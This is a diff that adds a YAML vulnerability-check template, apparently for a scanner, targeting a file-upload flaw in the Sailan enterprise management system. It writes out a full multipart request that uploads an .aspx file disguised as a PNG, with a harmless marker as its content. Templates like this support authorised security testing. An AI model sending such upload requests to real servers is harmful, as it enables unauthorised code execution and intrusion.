@@ -1,0 +1,27 @@
+id:
+
+info:
+  name: 赛蓝企业管理系统SubmitUploadify文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+    Connection: close
+  data: |
+    -----------------------------142851345723692939351758052805
+    Content-Disposition: form-data; name="Filedata"; filename="test2.aspx"
+    Content-Type: image/png
+
+    123456
+    -----------------------------142851345723692939351758052805--
+response1:
+  body: Resource/UploadFile/AppFiles
+  code: 200
+requests2:
+response2:
